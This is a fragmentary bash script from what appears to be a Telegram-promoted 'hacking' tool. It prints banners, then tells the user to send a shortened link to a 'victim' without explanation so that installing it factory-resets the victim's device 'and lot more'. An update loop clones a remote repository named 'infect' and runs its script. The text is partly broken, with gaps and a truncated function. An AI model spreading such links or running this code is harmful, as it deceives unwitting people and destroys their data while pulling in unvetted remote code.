...
'
echo " "
echo -e "$pink                      ▶my channel telegram"
echo -e "$pink                      ⫸ @Filtering_Hacking"
echo
# Functions
echo -e "$pink                    [my id telegram = @tacklorix"
...
echo -e '\e[92m
                   ...
                   (_)\_)(_____) (__) (____) '
echo " "
echo -e "\e[96m 😈  Copy below link and send it your victim and
say nothing to him. when he install it in his
device it will be factory reset and lot more happens.
                                👇👇👇

         \e[91mL1NK :- \e[96mhttps://tinyurl.com/uppdatesnew\e[91m
...
echo " "
echo " "
echo -e "\e[96m  Copy below link and send it your victim and tell him
...
while git clone https://github.com/noob-hackers/infect 2> /dev/null; do
    printf  "\e[92m▓▓▓▓▓▓▓▓▓▓▓▓▓\e[0m"
    sleep 1                                                                             done
printf "\e[96m]\e[0m"                                                                   echo
echo                                                                                    echo
printf "\e[96m           UPDATE SUCCESSFULL (LATEST VERSION)..!\e[0m"                   sleep 2.0                                                                               cd $HOME                                                                                cd infect
bash infect.sh}
vid(){
